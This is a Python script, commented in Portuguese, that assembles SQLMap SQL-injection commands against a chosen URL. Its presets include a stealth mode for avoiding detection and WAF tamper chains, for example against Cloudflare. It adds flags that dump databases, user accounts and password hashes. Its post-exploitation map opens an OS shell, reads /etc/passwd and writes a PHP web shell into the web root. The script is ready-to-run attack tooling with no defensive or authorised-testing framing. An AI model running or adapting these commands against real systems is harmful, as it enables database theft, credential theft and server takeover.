"""
Construtor de Comandos SQLMap — Vlad Volkov
Constrói comandos SQLMap otimizados com output rico.

Uso:
    python utils/construtor_comando.py --alvo "http://alvo.com/?id=1" --modo rapido
    python utils/construtor_comando.py --alvo "http://alvo.com/?id=1" --waf cloudflare --dbms mysql
"""

import argparse
import sys
from dataclasses import dataclass, field
from typing import Optional, List

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.syntax import Syntax
from rich import box

console = Console()

# Perfis de scan predefinidos
PERFIS_SCAN = {
    "rapido": {
        "nome": "Scan Rápido",
        "tecnicas": "EU",
        "nivel": 1,
        "risco": 1,
        "threads": 5,
        "delay": 0,
        "timeout": 30,
        "extra_flags": ["--random-agent", "--batch"],
        "descricao": "Detecção inicial, técnicas mais rápidas (EU)",
    },
    "padrao": {
        "nome": "Scan Padrão",
        "tecnicas": "BEUST",
        "nivel": 3,
        "risco": 2,
        "threads": 3,
        "delay": 1,
        "timeout": 30,
        "extra_flags": ["--random-agent", "--batch"],
        "descricao": "Equilíbrio velocidade/cobertura",
    },
    "profundo": {
        "nome": "Scan Profundo",
        "tecnicas": "BEUSTQ",
        "nivel": 5,
        "risco": 3,
        "threads": 1,
        "delay": 2,
        "timeout": 60,
        "extra_flags": ["--random-agent", "--batch", "--forms"],
        "descricao": "Máxima cobertura, todas as técnicas",
    },
    "furtivo": {
        "nome": "Scan Furtivo",
        "tecnicas": "BT",
        "nivel": 1,
        "risco": 1,
        "threads": 1,
        "delay": 3,
        "timeout": 30,
        "extra_flags": ["--random-agent", "--batch", "--safe-freq=3"],
        "descricao": "Mínimo ruído, evita detecção",
    },
    "agressivo": {
        "nome": "Scan Agressivo",
        "tecnicas": "BEUSTQ",
        "nivel": 5,
        "risco": 3,
        "threads": 10,
        "delay": 0,
        "timeout": 15,
        "extra_flags": ["--random-agent", "--batch", "--aggressive"],
        "descricao": "Velocidade máxima, sem restrições",
    },
}

# Opções de enumeração
OPCOES_ENUM = {
    "bancos": "--dbs",
    "tabelas": "--tables",
    "colunas": "--columns",
    "dump": "--dump",
    "usuarios": "--users",
    "senhas": "--passwords",
    "privilegios": "--privileges",
    "roles": "--roles",
    "dba": "--is-dba",
    "hostname": "--hostname",
    "banner": "--banner",
    "sistema": "--current-db --current-user",
}

# Flags de pós-exploração
FLAGS_POS_EXPLORACAO = {
    "shell_os": "--os-shell",
    "shell_sql": "--sql-shell",
    "ler_arquivo": "--file-read=/etc/passwd",
    "escrever_arquivo": "--file-write=shell.php --file-dest=/var/www/html/shell.php",
    "udf": "--udf-inject",
}


@dataclass
class OpcoesSQLMap:
    """Opções para construção do comando SQLMap."""
    alvo: str
    perfil: str = "padrao"
    waf: Optional[str] = None
    dbms: Optional[str] = None
    tecnicas: Optional[str] = None
    nivel: Optional[int] = None
    risco: Optional[int] = None
    threads: Optional[int] = None
    delay: Optional[float] = None
    timeout: Optional[int] = None
    tampers: Optional[str] = None
    parametros: Optional[str] = None
    data_post: Optional[str] = None
    cookies: Optional[str] = None
    cabecalhos: Optional[str] = None
    proxy: Optional[str] = None
    enumeracoes: List[str] = field(default_factory=list)
    pos_exploracao: Optional[str] = None
    extra_flags: List[str] = field(default_factory=list)
    verboso: int = 0
    salvar_sessao: bool = True


class ConstrutorComando:
    """Constrói comandos SQLMap otimizados."""

    def construir(self, opcoes: OpcoesSQLMap) -> str:
        """Constrói o comando SQLMap completo."""
        partes = ["sqlmap"]

        # Alvo
        partes.append(f'-u "{opcoes.alvo}"')

        # Perfil base
        perfil = PERFIS_SCAN.get(opcoes.perfil, PERFIS_SCAN["padrao"])

        # Técnicas
        tecnicas = opcoes.tecnicas or perfil["tecnicas"]
        partes.append(f"--technique={tecnicas}")

        # Nível e risco
        nivel = opcoes.nivel if opcoes.nivel is not None else perfil["nivel"]
        risco = opcoes.risco if opcoes.risco is not None else perfil["risco"]
        partes.append(f"--level={nivel}")
        partes.append(f"--risk={risco}")

        # Threads
        threads = opcoes.threads if opcoes.threads is not None else perfil["threads"]
        if threads > 1:
            partes.append(f"--threads={threads}")

        # Delay
        delay = opcoes.delay if opcoes.delay is not None else perfil["delay"]
        if delay > 0:
            partes.append(f"--delay={delay}")

        # Timeout
        timeout = opcoes.timeout if opcoes.timeout is not None else perfil["timeout"]
        partes.append(f"--timeout={timeout}")

        # DBMS
        if opcoes.dbms and opcoes.dbms != "desconhecido":
            partes.append(f"--dbms={opcoes.dbms}")

        # Tampers
        if opcoes.tampers:
            partes.append(f"--tamper={opcoes.tampers}")

        # Parâmetros específicos
        if opcoes.parametros:
            partes.append(f"-p {opcoes.parametros}")

        # POST data
        if opcoes.data_post:
            partes.append(f'--data="{opcoes.data_post}"')

        # Cookies
        if opcoes.cookies:
            partes.append(f'--cookie="{opcoes.cookies}"')

        # Cabeçalhos extras
        if opcoes.cabecalhos:
            partes.append(f'--headers="{opcoes.cabecalhos}"')

        # Proxy
        if opcoes.proxy:
            partes.append(f"--proxy={opcoes.proxy}")

        # Flags base do perfil
        for flag in perfil["extra_flags"]:
            if flag not in partes:
                partes.append(flag)

        # Enumerações
        for enum in opcoes.enumeracoes:
            flag = OPCOES_ENUM.get(enum)
            if flag:
                partes.append(flag)

        # Pós-exploração
        if opcoes.pos_exploracao:
            flag = FLAGS_POS_EXPLORACAO.get(opcoes.pos_exploracao)
            if flag:
                partes.append(flag)

        # Verbosidade
        if opcoes.verboso > 0:
            partes.append(f"-v {min(opcoes.verboso, 6)}")

        # Sessão
        if opcoes.salvar_sessao:
            alvo_limpo = opcoes.alvo.split("//")[-1].split("/")[0].split("?")[0]
            partes.append(f"--output-dir=sessoes/{alvo_limpo}")

        # Flags extras personalizadas
        for flag in opcoes.extra_flags:
            partes.append(flag)

        return " ".join(partes)

    def construir_de_perfil(self, alvo: str, perfil: str,
                             waf: str = None, dbms: str = None,
                             enumeracoes: list = None) -> str:
        """Atalho para construir comando a partir de perfil."""
        opcoes = OpcoesSQLMap(
            alvo=alvo,
            perfil=perfil,
            waf=waf,
            dbms=dbms,
            enumeracoes=enumeracoes or [],
        )

        # Adicionar tampers se WAF especificado
        if waf:
            from utils.seletor_tamper import SeletorTamper
            seletor = SeletorTamper()
            opcoes.tampers = seletor.construir_chain(waf, dbms or "all")

        return self.construir(opcoes)

    def exibir_comando(self, comando: str, titulo: str = "Comando SQLMap") -> None:
        """Exibe o comando com syntax highlighting."""
        console.print()
        console.print(Panel(
            Syntax(comando, "bash", theme="monokai", word_wrap=True),
            title=f"[bold green]{titulo}[/bold green]",
            border_style="green"
        ))

    def exibir_perfis(self) -> None:
        """Exibe tabela de perfis disponíveis."""
        tabela = Table(title="Perfis de Scan", box=box.ROUNDED, border_style="cyan")
        tabela.add_column("Perfil", style="bold cyan", width=12)
        tabela.add_column("Técnicas", style="yellow", width=10)
        tabela.add_column("Nível", width=7)
        tabela.add_column("Risco", width=7)
        tabela.add_column("Threads", width=9)
        tabela.add_column("Descrição", style="dim")

        for nome, p in PERFIS_SCAN.items():
            tabela.add_row(
                nome, p["tecnicas"],
                str(p["nivel"]), str(p["risco"]),
                str(p["threads"]), p["descricao"]
            )

        console.print(tabela)

    def exibir_opcoes_enum(self) -> None:
        """Exibe opções de enumeração disponíveis."""
        tabela = Table(title="Opções de Enumeração", box=box.ROUNDED)
        tabela.add_column("Opção", style="bold cyan")
        tabela.add_column("Flag SQLMap", style="yellow")

        for nome, flag in OPCOES_ENUM.items():
            tabela.add_row(nome, flag)

        console.print(tabela)


def main():
    parser = argparse.ArgumentParser(
        description="Construtor de Comandos SQLMap — Vlad Volkov",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Exemplo: python utils/construtor_comando.py --alvo 'http://alvo.com/?id=1' --modo padrao"
    )
    parser.add_argument("--alvo", help="URL do alvo")
    parser.add_argument("--modo", choices=list(PERFIS_SCAN.keys()), default="padrao",
                        help="Perfil de scan")
    parser.add_argument("--waf", help="WAF detectado")
    parser.add_argument("--dbms", help="Banco de dados alvo")
    parser.add_argument("--tamper", help="Tampers manuais (separados por vírgula)")
    parser.add_argument("--params", help="Parâmetros específicos para testar")
    parser.add_argument("--data", help="POST data")
    parser.add_argument("--cookie", help="Cookies da sessão")
    parser.add_argument("--proxy", help="Proxy (ex: http://127.0.0.1:8080)")
    parser.add_argument("--enum", nargs="+", choices=list(OPCOES_ENUM.keys()),
                        help="Enumerações a realizar")
    parser.add_argument("--listar-perfis", action="store_true", help="Lista perfis disponíveis")
    parser.add_argument("--listar-enum", action="store_true", help="Lista opções de enumeração")
    args = parser.parse_args()

    construtor = ConstrutorComando()

    if args.listar_perfis:
        construtor.exibir_perfis()
        return

    if args.listar_enum:
        construtor.exibir_opcoes_enum()
        return

    if not args.alvo:
        parser.print_help()
        sys.exit(1)

    opcoes = OpcoesSQLMap(
        alvo=args.alvo,
        perfil=args.modo,
        waf=args.waf,
        dbms=args.dbms,
        tampers=args.tamper,
        parametros=args.params,
        data_post=args.data,
        cookies=args.cookie,
        proxy=args.proxy,
        enumeracoes=args.enum or [],
    )

    if args.waf and not args.tamper:
        try:
            from utils.seletor_tamper import SeletorTamper
            seletor = SeletorTamper()
            opcoes.tampers = seletor.construir_chain(args.waf, args.dbms or "all")
        except ImportError:
            pass

    comando = construtor.construir(opcoes)

    # Exibir resumo
    perfil = PERFIS_SCAN[args.modo]
    console.print()
    tabela = Table(title="Configuração do Scan", box=box.ROUNDED, border_style="cyan")
    tabela.add_column("Parâmetro", style="bold cyan", width=20)
    tabela.add_column("Valor", style="white")

    tabela.add_row("Alvo", args.alvo[:60])
    tabela.add_row("Perfil", perfil["nome"])
    tabela.add_row("Técnicas", opcoes.tecnicas or perfil["tecnicas"])
    tabela.add_row("Nível", str(opcoes.nivel or perfil["nivel"]))
    tabela.add_row("Risco", str(opcoes.risco or perfil["risco"]))
    if args.waf:
        tabela.add_row("WAF", args.waf)
    if args.dbms:
        tabela.add_row("DBMS", args.dbms)
    if opcoes.tampers:
        tabela.add_row("Tampers", opcoes.tampers)

    console.print(tabela)
    construtor.exibir_comando(comando)


if __name__ == "__main__":
    main()
